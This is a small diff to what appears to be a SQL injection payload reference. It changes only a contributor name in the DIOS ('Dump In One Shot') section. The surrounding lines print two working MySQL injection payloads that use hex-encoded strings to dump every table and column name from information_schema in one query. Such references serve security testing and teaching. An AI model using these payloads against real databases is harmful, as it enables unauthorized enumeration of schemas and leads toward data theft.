@@ -471,7 +471,7 @@ DIOS (Dump In One Shot) SQL Injection is an advanced technique that allows an at
     +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
     ```
 
-* sharik
+* Shariq
     ```sql
     (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
     ```
